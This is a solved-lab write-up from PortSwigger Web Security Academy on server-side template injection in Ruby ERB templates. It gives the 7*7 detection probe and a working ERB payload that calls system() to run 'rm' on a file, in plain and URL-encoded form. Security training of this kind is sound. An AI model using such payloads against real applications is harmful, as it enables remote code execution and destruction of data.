# Basic Server-Side Template Injection (SSTI) — ERB


> **Platform:** PortSwigger Web Security Academy

> **Difficulty:** Practitioner

> **Vulnerability:** Server-Side Template Injection (SSTI)

> **Template Engine:** ERB / Ruby

> **Status:** Solved ✅



## 1. What is SSTI?



**Server-Side Template Injection (SSTI)** occurs when user-controlled input is unsafely embedded directly into a 
server-side template instead of being passed as data.



The template engine then interprets the attacker-controlled input as template syntax or code.



```text

User Input

    ↓

HTTP Request

    ↓

Application

    ↓

Template Engine

    ↓

Template Code Evaluation

    ↓

HTTP Response

```



Depending on the template engine and its configuration, SSTI can potentially lead to:



* Sensitive data disclosure

* Arbitrary file read

* Server-side code execution

* Remote Code Execution (RCE)



> **Important:** SSTI does not automatically mean RCE. The impact depends on the template engine, configuration, 
and available privileges.


**Reference:** [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)


---



# 2. Lab Objective



The application is vulnerable to SSTI due to the unsafe construction of an **ERB template**.



### Goal



Execute arbitrary code and delete:



```text

/home/carlos/morale.txt

```



---



# 3. Identify the Template Engine



The lab uses:



```text

ERB (Embedded Ruby)

```



ERB allows Ruby expressions to be evaluated inside templates.



A basic ERB expression is:



```erb

<%= expression %>

```



For example:



```erb

<%= 7*7 %>

```




should evaluate to:



```text

49

```



---



# 4. Detect SSTI



First, identify a parameter whose value is reflected in the application's response.



Then test whether template expressions are evaluated.



### Test Payload



```erb

<%= 7*7 %>

```



If the response contains:



```text

49

```



instead of:



```text

<%= 7*7 %>

```



this indicates that the input is being interpreted by the ERB template engine.



### Why?



Because the server is evaluating:



```ruby

7*7

```



and inserting the result into the rendered response.



Therefore:



```text

<%= 7*7 %>

       ↓

      49

```



---



# 5. Exploitation



Once ERB evaluation is confirmed, we can use Ruby functionality available to the template.



The lab requires deleting:



```text

/home/carlos/morale.txt

```



The Ruby `system()` method can execute an operating-system command.



Conceptually:



```ruby

system("rm /home/carlos/morale.txt")

```



Inside ERB:



```erb

<%= system("rm /home/carlos/morale.txt") %>

```



The payload used in the lab was URL-encoded:



```text

<%25+system("rm+/home/carlos/morale.txt")+%25>

```



---



# 6. Understanding the URL Encoding



The payload contains:



```text

%25

```



because `%25` is the URL-encoded representation of:



```text

%

```



So after URL decoding:



```text

<%25+system("rm+/home/carlos/morale.txt")+%25>

```



becomes conceptually:



```text

<% system("rm /home/carlos/morale.txt") %>

```



The `+` characters represent spaces in a typical URL query-string context.



---



# 7. Exploitation Chain



The complete attack flow is:



```text

User-Controlled Input

        ↓

SSTI

        ↓

ERB Template

        ↓

Ruby Expression

        ↓

system()

        ↓

OS Command

        ↓

rm /home/carlos/morale.txt

```



Therefore, this lab demonstrates:


```text

SSTI → Ruby Code Execution → OS Command Execution → RCE

```



---




# 8. Key Takeaways



### SSTI vs XSS



**XSS:**



```text

Payload

   ↓

Browser

   ↓

JavaScript execution

```



**SSTI:**



```text

Payload

   ↓

Server

   ↓

Template Engine

   ↓

Server-side evaluation

```



The key difference is **where the injected code is interpreted**.



### Important points to remember



* SSTI happens on the **server side**.

* The vulnerable component is the **template engine**.

* User input must be incorrectly inserted into the **template itself**.

* `data` and `template code` should be kept separate.

* `{{7*7}}`, `<%= 7*7 %>`, etc. are detection techniques; the correct syntax depends on the template engine.


* Identifying the template engine is an important step before exploitation.


* SSTI can sometimes escalate to **RCE**.


---



# 9. Methodology



```text

1. Find an input that is reflected/rendered

        ↓

2. Test for template expression evaluation

        ↓

3. Identify the template engine

        ↓

4. Understand its capabilities

        ↓

5. Exploit the vulnerability

        ↓

6. Achieve the intended objective

```



**Lab Status: ✅ Solved**



**Main lesson:**



> SSTI occurs when attacker-controlled input is treated as part of a server-side template rather than as ordinary 
data. In this lab, the vulnerable ERB template allowed Ruby code execution, which was then used to execute an OS 
command.**

